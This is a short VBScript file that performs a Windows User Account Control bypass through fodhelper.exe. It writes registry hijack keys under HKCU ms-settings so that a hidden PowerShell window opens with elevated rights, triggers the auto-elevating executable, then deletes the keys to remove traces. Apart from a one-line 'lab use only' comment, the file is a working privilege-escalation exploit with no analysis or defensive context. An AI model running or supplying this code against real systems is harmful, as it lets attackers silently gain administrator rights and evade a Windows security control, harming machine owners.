' === UAC Bypass via fodhelper.exe ===
' Works on many Windows 10/11 builds (lab use only)

Set shell = CreateObject("WScript.Shell")

' PowerShell command to run elevated
elevatedCmd = "powershell -NoExit -WindowStyle Hidden"

' Write registry hijack keys
shell.RegWrite "HKCU\Software\Classes\ms-settings\Shell\Open\command\", elevatedCmd, "REG_SZ"
shell.RegWrite "HKCU\Software\Classes\ms-settings\Shell\Open\command\DelegateExecute", "", "REG_SZ"

' Trigger auto-elevated executable (fodhelper.exe)
CreateObject("WScript.Shell").Run "fodhelper.exe", 0, False

' Wait a few seconds for execution
WScript.Sleep 4000

' Clean up registry keys
On Error Resume Next
shell.RegDelete "HKCU\Software\Classes\ms-settings\Shell\Open\command\DelegateExecute"
shell.RegDelete "HKCU\Software\Classes\ms-settings\Shell\Open\command\"
shell.RegDelete "HKCU\Software\Classes\ms-settings\Shell\Open\"
shell.RegDelete "HKCU\Software\Classes\ms-settings\Shell\"
shell.RegDelete "HKCU\Software\Classes\ms-settings\"
